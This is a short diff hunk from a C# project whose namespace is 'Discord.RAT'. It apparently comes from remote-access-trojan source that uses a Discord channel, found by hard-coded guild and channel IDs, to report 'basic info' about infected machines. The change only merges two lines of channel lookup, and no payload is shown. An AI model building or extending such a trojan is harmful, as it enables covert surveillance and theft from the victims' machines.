@@ -49,8 +49,7 @@ namespace Discord.RAT
             ulong gid = 881998970057003009;
             ulong cid = 881998970518380546;
 
-            var Guild = Client.GetGuild(gid);
-            var channel = Guild.GetTextChannel(cid);
+            var channel = Client.GetGuild(gid).GetTextChannel(cid);
             //basic info.
             var embed = new EmbedBuilder
             {
